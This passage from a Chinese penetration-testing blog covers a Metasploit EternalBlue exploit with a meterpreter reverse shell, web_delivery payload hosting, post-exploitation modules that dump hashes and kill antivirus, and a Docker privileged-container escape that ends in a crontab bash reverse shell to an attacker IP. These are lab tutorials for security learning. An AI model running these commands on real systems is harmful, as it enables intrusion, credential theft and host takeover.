class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2）攻击"><a href="#2）攻击" class="headerlink" title="2）攻击"></a>2）攻击</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">------------------msf5 <span class="token operator">&gt;</span> use exploit/windows/smb/ms17_010_eternalbluemsf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/x64/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.1.200RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.1.200msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.1.150LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.1.150msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit----------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h3 id="实战EX：msf-永恒之蓝-ms17-010"><a href="#实战EX：msf-永恒之蓝-ms17-010" class="headerlink" title="实战EX：msf 永恒之蓝 ms17-010"></a>实战EX：msf 永恒之蓝 ms17-010</h3><p>1、扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>scanner/http/dir_scanner<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/scanner/smb/smb_ms17_010 msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.33.0/24RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.33.0/24msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">100</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">100</span>msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.4:445      - Host is likely VULNERABLE to MS17-010<span class="token operator">!</span> - Windows Server <span class="token number">2008</span> R2 Enterprise <span class="token number">7601</span> Service Pack <span class="token number">1</span> x64 <span class="token punctuation">(</span><span class="token number">64</span>-bit<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned  <span class="token number">34</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">13</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned  <span class="token number">95</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">37</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">101</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">39</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">104</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">40</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">134</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">52</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">167</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">65</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">180</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">70</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">206</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">80</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">233</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">91</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completedmsf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、攻击</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">&gt;</span> use exploit/windows/smb/ms17_010_eternalblue<span class="token punctuation">[</span>*<span class="token punctuation">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcpmsf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/x64/meterpreter/reverse_tcpmsf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHoSTS <span class="token number">192.168</span>.33.4 RHoSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.33.4msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.33.12LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.33.12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2014.27.12.png" style="zoom:50%;"><p>3、执行meterpreter</p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2014.27.45.png" style="zoom:50%;"><p>进入shell在能执行whoami，并且获得system权限。</p></blockquote><h2 id="5-6-Metepreter命令"><a href="#5-6-Metepreter命令" class="headerlink" title="5.6 Metepreter命令"></a>5.6 Metepreter命令</h2><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td>background</td><td>将Meterpreter 终端隐藏在后台</td></tr><tr><td>sessions</td><td>查看已经成功获取的会话。-i 选项，切入后台会话</td></tr><tr><td>shell</td><td>获取系统的控制台shell</td></tr><tr><td>quit</td><td>关闭当前的Meterpreter 会话，返回MSF 终端</td></tr><tr><td>pwd</td><td>获取目标机上当前的工作目录</td></tr><tr><td>cd</td><td>切换目录 两个反斜杠</td></tr><tr><td>ls</td><td>查看当前目录下内容</td></tr><tr><td>upload</td><td>上传文件</td></tr><tr><td>cat</td><td>查看文件内容</td></tr><tr><td>edit</td><td>编辑文件</td></tr><tr><td>download</td><td>下载文件</td></tr><tr><td>search</td><td>搜索文件</td></tr><tr><td>ifconfig/ipconfig</td><td>查看网卡信息</td></tr><tr><td>route</td><td>查看路由信息，设置路由</td></tr><tr><td>sysinfo</td><td>查看系统信息</td></tr><tr><td>getuid</td><td>获取当前用户id</td></tr><tr><td>ps</td><td>看进程</td></tr><tr><td>getpid</td><td>查看当前进程</td></tr><tr><td>migrate</td><td>切换进程(切换资源管理器exploer.exe)</td></tr><tr><td>execute</td><td>执行文件</td></tr><tr><td>kill</td><td>终结指定PID 的进程</td></tr><tr><td>shutdown</td><td>关机</td></tr><tr><td>screenshot</td><td>屏幕快照</td></tr></tbody></table><h1 id="六、MSF-进阶实战"><a href="#六、MSF-进阶实战" class="headerlink" title="六、MSF 进阶实战"></a>六、MSF 进阶实战</h1><h2 id="6-1-exploit"><a href="#6-1-exploit" class="headerlink" title="6.1 exploit"></a>6.1 exploit</h2><h3 id="6-1-1-exploit-multi-script-web-delivery-模块"><a href="#6-1-1-exploit-multi-script-web-delivery-模块" class="headerlink" title="6.1.1 exploit/multi/script/web_delivery 模块"></a>6.1.1 exploit/multi/script/web_delivery 模块</h3><h4 id="1）简介"><a href="#1）简介" class="headerlink" title="1）简介"></a>1）简介</h4><p>exploit/multi/script/web_delivery 是 Metasploit Framework 中的一个模块，主要用于远程执行代码。它通过 Web 服务器向受害者的浏览器发送恶意脚本，这些脚本会在目标机器上执行。</p><p>功能和用途</p><ul><li><strong>快速建立会话</strong>：该模块可以在攻击者的机器上快速启动一个 Web 服务器，托管有效负载。当目标机器连接到该服务器并执行有效负载时，会建立一个会话。</li><li><strong>支持多种脚本语言</strong>：支持 Python、PHP 和 PowerShell 等脚本语言，可以根据目标环境选择合适的语言。</li><li><strong>隐蔽性强</strong>：由于有效负载不会写入目标机器的磁盘，因此不太可能触发防病毒软件和其他防御机制。</li><li><strong>应用场景</strong>：适用于渗透测试和攻击模拟，特别是在已经获得一定权限但不完全控制目标系统的情况下。</li></ul><h4 id="2）使用方法"><a href="#2）使用方法" class="headerlink" title="2）使用方法"></a>2）使用方法</h4><ol><li><p>加载模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">&gt;</span> use exploit/multi/script/web_delivery<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置参数：</p><ul><li><strong>选择目标语言</strong>：例如，选择 PHP 或 PowerShell.</li><li><strong>设置有效负载</strong>：例如，使用 <code>php/meterpreter/reverse_tcp</code> 作为有效负载.</li><li><strong>设置监听地址和端口</strong>：例如，<code>set lhost 192.168.1.100</code> 和 <code>set lport 8080</code> .</li><li>TARGET：</li></ul><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2015.12.55.png" alt="msf6的情形" style="zoom:40%;"></li><li><p>运行模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行后，模块会生成一个命令，该命令需要在目标机器上执行以下载并运行有效负载。</p></li></ol><h4 id="3）实战"><a href="#3）实战" class="headerlink" title="3）实战"></a>3）实战</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/script/web_delivery<span class="token builtin class-name">set</span> target <span class="token number">7</span>    <span class="token comment"># 选择目标系统</span><span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.1.7<span class="token builtin class-name">set</span> lport <span class="token number">4446</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="七、内网信息收集"><a href="#七、内网信息收集" class="headerlink" title="七、内网信息收集"></a>七、内网信息收集</h1><p>当我们设置全局代理（通常可以通过ew等隧道工具+proxychains来实现），那么就可以在MSF中使用模块来对内网段进行扫描：</p><h2 id="7-1-扫描"><a href="#7-1-扫描" class="headerlink" title="7.1 扫描"></a>7.1 扫描</h2><p>常用的扫描模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxiliary/scanner/discovery/arp_sweep <span class="token comment">#基于arp协议发现内网存活主机，这不能通过代理使用</span>auxiliary/scanner/portscan/ack <span class="token comment">#基于tcp的ack回复进行端口扫描，默认扫描1-10000端口</span>auxiliary/scanner/portscan/tcp <span class="token comment">#基于tcp进行端口扫描，默认扫描1-10000端口</span>auxiliary/scanner/discovery/udp_sweep <span class="token comment">#基于udp协议发现内网存活主机</span>auxiliary/scanner/discovery/udp_probe <span class="token comment">#基于udp协议发现内网存活主机</span>auxiliary/scanner/netbios/nbname <span class="token comment">#基于netbios协议发现内网存活主机</span>auxiliary/scanner/ftp/ftp_version <span class="token comment">#发现内网ftp服务，基于默认21端口</span>auxiliary/scanner/ssh/ssh_version <span class="token comment">#发现内网ssh服务，基于默认22端口</span>auxiliary/scanner/telnet/telnet_version <span class="token comment">#发现内网telnet服务，基于默认23端口</span>auxiliary/scanner/dns/dns_amp <span class="token comment">#发现dns服务，基于默认53端口</span>auxiliary/scanner/http/http_version <span class="token comment">#发现内网http服务，基于默认80端口</span>auxiliary/scanner/http/title <span class="token comment">#探测内网http服务的标题</span>auxiliary/scanner/smb/smb_version <span class="token comment">#发现内网smb服务，基于默认的445端口</span>auxiliary/scanner/mssql/mssql_schemadump <span class="token comment">#发现内网SQLServer服务,基于默认的1433端口</span>auxiliary/scanner/oracle/oracle_hashdump <span class="token comment">#发现内网oracle服务,基于默认的1521端口</span>auxiliary/scanner/mysql/mysql_version <span class="token comment">#发现内网mysql服务，基于默认3306端口</span>auxiliary/scanner/rdp/rdp_scanner <span class="token comment">#发现内网RDP服务，基于默认3389端口</span>auxiliary/scanner/redis/redis_server <span class="token comment">#发现内网Redis服务，基于默认6379端口</span>auxiliary/scanner/db2/db2_version <span class="token comment">#探测内网的db2服务，基于默认的50000端口</span>auxiliary/scanner/netbios/nbname<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-2-域内信息收集"><a href="#7-2-域内信息收集" class="headerlink" title="7.2 域内信息收集"></a>7.2 域内信息收集</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run post/windows/gather/enum_logged_on_users <span class="token comment">#查看登录过的用户信息</span>run post/windows/gather/enum_ad_groups <span class="token comment">#查看组信息</span>run post/windows/gather/enum_domain <span class="token comment">#定位域控</span>run post/windows/gather/enum_ad_computers <span class="token comment">#域内所有机器</span>run post/windows/gather/enum_patches <span class="token comment">#发现缺失的补丁</span>run post/multi/recon/local_exploit_suggester <span class="token comment">#快速识别可能被利用的漏洞</span>run post/windows/manage/migrate <span class="token comment">#自动进程迁移</span>run post/windows/gather/checkvm <span class="token comment">#查看目标主机是否运行在虚拟机上</span>run post/windows/manage/killav <span class="token comment">#关闭杀毒软件</span>run post/windows/manage/enable_rdp <span class="token comment">#开启远程桌面服务</span>run post/windows/manage/autoroute <span class="token comment">#查看路由信息</span>run post/windows/gather/enum_logged_on_users <span class="token comment">#列举当前登录的用户</span>run post/windows/gather/enum_applications <span class="token comment">#列举应用程序</span>run post/windows/gather/credentials/windows_autologin <span class="token comment">#抓取自动登录的用户名和密码</span>run post/windows/gather/smart_hashdump <span class="token comment">#dump出所有用户的hash</span>run post/windows/gather/enum_domain_tokens <span class="token comment">#寻找域token</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>.</p>]]></content>
      
      
      <categories>
          
          <category> 攻防工具库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防工具库 </tag>
            
            <tag> MSF </tag>
            
            <tag> Metasploit Framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker特权模式容器逃逸</title>
      <link href="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/"/>
      <url>/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h1><p>Docker特权模式是一种容器运行模式，它允许容器以较高的权限运行，从而能够访问宿主机的几乎所有设备和资源。特权模式的主要目的是为了提供更大的灵活性和功能，以便容器可以执行一些通常需要更高权限的操作。</p><p>特权模式在6.0版本的时候被引入Docker，其核心作用是允许容器内的root拥有外部物理机的root权限，而此前在容器内的root用户只有外部物理机普通用户的权限。</p><p>Docker特权模式容器逃逸是指在容器以特权模式启动时，攻击者可以利用容器的高权限访问宿主机的文件系统或其他资源，从而实现对宿主机的控制。</p><h1 id="二、逃逸的基本原理"><a href="#二、逃逸的基本原理" class="headerlink" title="二、逃逸的基本原理"></a>二、逃逸的基本原理</h1><p>当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</p><p>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p><p>总之，使用特权模式启动容器后（docker run –privileged）：Docker容器被允许可以访问主机上的所有设备、可以获取大量设备文件的访问权限、可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务contrab等方式在宿主机执行命令。(反弹shell)</p><h1 id="三、漏洞复现（centos7复现失败）"><a href="#三、漏洞复现（centos7复现失败）" class="headerlink" title="三、漏洞复现（centos7复现失败）"></a>三、漏洞复现（centos7复现失败）</h1><p>特权模式逃逸是一种最简单有效的逃逸方法，攻击者可以通过挂载宿主机目录到容器某个目录下，直接通过命令、写ssh公钥和crontab等getshell。</p><h2 id="3-1-特权模式启动容器"><a href="#3-1-特权模式启动容器" class="headerlink" title="3.1 特权模式启动容器"></a>3.1 特权模式启动容器</h2><p>（1）创建容器时通过添加–privileged=true参数，将容器以特权模式启动</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-itd</span> <span class="token parameter variable">--name</span> privilegeTestUbuntu <span class="token parameter variable">--privileged</span> ubuntu:18.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令详解：</p><ul><li><code>docker run</code>: 创建并启动一个新的容器.</li><li><code>-itd</code>：<ul><li><code>-i</code> 或 <code>--interactive</code>: 保持标准输入（STDIN）打开，即使不附加到容器终端.</li><li><code>-t</code> 或 <code>--tty</code>: 分配一个伪终端.</li><li><code>-d</code> 或 <code>--detach</code>: 在后台运行容器并返回容器ID.</li></ul></li><li><code>--name privilegeTestUbuntu</code>: 为容器指定一个名称</li><li><code>--privileged</code>: 以特权模式运行容器. 这将给予容器几乎与宿主机相同的权限，使其可以访问宿主机的所有设备、文件系统等.</li></ul></blockquote><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.21.45.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.22.04.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.22.41.png" alt="进入容器" style="zoom:50%;"><ul><li>在k8s中，在pod的yaml配置中添加如下配置时，也会以特权模式启动容器</li></ul><pre class="line-numbers language-none"><code class="language-none">securityContext:      privileged: true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2009.46.43.png" style="zoom:50%;"><p>（2） 特权模式起的容器，实战中可通过<code>cat /proc/self/status |grep Cap</code>命令判断当前容器是否通过特权模式起（0000001fffffffff代表为特权模式起动）</p><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.23.28.png" alt="截屏2025-01-07 10.23.28" style="zoom:50%;"><p>关注CapEff的值，0000001fffffffff代表为特权模式起动（存疑）。</p><h2 id="3-2-将宿主机根目录挂载进容器目录"><a href="#3-2-将宿主机根目录挂载进容器目录" class="headerlink" title="3.2 将宿主机根目录挂载进容器目录"></a>3.2 将宿主机根目录挂载进容器目录</h2><p>fdisk -l命令查看宿主机设备为/dev/vda1</p><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.24.12.png" style="zoom:50%;"><p>通过mount命令将宿主机根目录挂载进容器目录的test中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> /dev/sda1 /home/test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.25.22.png" style="zoom:50%;"><p>/home/test 目录中挂载过来的内容并不是宿主机的根目录。</p><h2 id="3-3-改变根目录，写宿主机目录"><a href="#3-3-改变根目录，写宿主机目录" class="headerlink" title="3.3 改变根目录，写宿主机目录"></a>3.3 改变根目录，写宿主机目录</h2><p>使用chroot改变根目录</p><p>chroot /home/test/</p><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.01.17.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.26.01.png" alt="chroot失败" style="zoom:50%;"><p>容器中没有 /bin/sh，从宿主机复制一个进去试一下：</p><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.04.02.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.04.26.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.05.36.png" style="zoom:50%;"><p>还是报错。</p><p>复现失败。</p><h1 id="四、逃逸复现（ubuntu14-04复现成功）"><a href="#四、逃逸复现（ubuntu14-04复现成功）" class="headerlink" title="四、逃逸复现（ubuntu14.04复现成功）"></a>四、逃逸复现（ubuntu14.04复现成功）</h1><p>具体环境见本站《三层网络域渗透靶场（WHOAMII）搭建》一文，ubuntu系统为环境中对应的名为web2的系统。</p><h2 id="4-1-判断Docker容器是否是特权模式"><a href="#4-1-判断Docker容器是否是特权模式" class="headerlink" title="4.1 判断Docker容器是否是特权模式"></a>4.1 判断Docker容器是否是特权模式</h2><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.33.52.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.31.03.png" style="zoom:50%;"><p>如果是以特权模式启动的话，CapEff对应的掩码值应该为0000003fffffffff。</p><h2 id="4-2-查看系统目录"><a href="#4-2-查看系统目录" class="headerlink" title="4.2 查看系统目录"></a>4.2 查看系统目录</h2><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.34.39.png" style="zoom:50%;"><blockquote><p><code>fdisk -l</code> 是一个常用的命令，用于列出系统中所有可用的磁盘分区信息。<code>fdisk</code> 是一个磁盘分区表操作工具，而 <code>-l</code> 选项用于列出所有分区表信息，而不进行任何修改。</p></blockquote><p>宿主机根目录为 /dev/sda1</p><h2 id="4-3-挂载系统目录"><a href="#4-3-挂载系统目录" class="headerlink" title="4.3 挂载系统目录"></a>4.3 挂载系统目录</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> /dev/sda1 /home/test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.36.18.png" style="zoom:50%;"><h2 id="4-4-chroot改变根目录"><a href="#4-4-chroot改变根目录" class="headerlink" title="4.4 chroot改变根目录"></a>4.4 chroot改变根目录</h2><p>使用chroot改变根目录进入到宿主机的磁盘空间。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chroot</span> /home/test/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.37.51.png" style="zoom:50%;"><h2 id="4-5-攻击端监听反弹shell"><a href="#4-5-攻击端监听反弹shell" class="headerlink" title="4.5 攻击端监听反弹shell"></a>4.5 攻击端监听反弹shell</h2><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.40.03.png" style="zoom:50%;"><p>这里kali的ip 192.168.52.5/24，受害主机的ip为 192.168.52.20/24。具体攻击场景中，如果受害主机可以出网，攻击者可以用公网的VPS来介绍反弹的shell连接。</p><h2 id="4-6-直接执行命令或写crontab"><a href="#4-6-直接执行命令或写crontab" class="headerlink" title="4.6 直接执行命令或写crontab"></a>4.6 直接执行命令或写crontab</h2><h3 id="4-6-1-直接执行反弹shell的命令"><a href="#4-6-1-直接执行反弹shell的命令" class="headerlink" title="4.6.1 直接执行反弹shell的命令"></a>4.6.1 直接执行反弹shell的命令</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/192.168.52.5/4444 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.55.59.png" style="zoom:50%;"><p>直接执行失败。chroot之后进入的是宿主机的目录，但是并不具备直接在宿主机执行命令的能力。可以通过操作宿主机文件（定时任务配置文件）的方式来实现反弹shell。</p><h3 id="4-6-2-定时任务"><a href="#4-6-2-定时任务" class="headerlink" title="4.6.2 定时任务"></a>4.6.2 定时任务</h3><ul><li>尝试直接写定时任务：</li></ul><pre class="line-numbers language-none"><code class="language-none">crontab -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.58.37.png" alt="截屏2025-01-07 10.58.37" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.59.27.png" alt="截屏2025-01-07 10.59.27" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.00.15.png" style="zoom:50%;"><p>写入失败。</p><ul><li>编辑配置文件：</li></ul><p>尝试在chroot之前（或者exit退出chroot的目录之后）直接写入/home/test/etc/crontab 配置文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.52.5/5555 0&gt;&amp;1"</span> <span class="token operator">&gt;&gt;</span> /home/test/etc/crontab（每分钟执行一次）<span aria-hidden="true" 